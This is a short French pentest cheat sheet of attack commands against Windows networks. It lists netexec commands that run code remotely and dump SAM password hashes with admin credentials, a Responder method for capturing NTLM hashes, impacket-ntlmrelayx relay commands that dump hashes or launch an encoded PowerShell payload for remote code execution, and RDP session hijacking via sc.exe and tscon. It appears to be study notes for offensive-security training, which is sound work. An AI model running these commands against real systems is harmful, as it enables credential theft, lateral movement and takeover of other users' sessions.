# SMB et admin

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#Exécution de commandes
netexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
#Énumérer les utilisateurs authentifiés
netexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
#Extraire les hash du SAM
netexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Obtenir hash par SMB
Utiliser Responder pour écouter et passer un chemin style //192.168.23.245 sur l'application victime

Par multicast:
ex: typo dans nom de partage ```\\mysharefoder\``` au lieu de ```\\mysharedfolder\```
Procédure de résolution de nom de partage
1. vérification dans C:\Windows\System32\Drivers\etc\hosts
2. cache dns locale
3. DNS server
4. Multicast demandant adresse IP du partage.

# relay ntlm
Attend une connection et ...

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~shell
#dump les SAM de la cible
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
#RCE
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGw...'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# RPC
https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf

# Hijack sessions RDP
Besoin d'être system, ou admin et devenir système

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~powershell 
#découvrir les sessions
query user
# sessionshijack est le nom de service, 2 le id de la session à voler, dest est le nom de notre session
#utilise tscon pour se connecter à une autre session
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


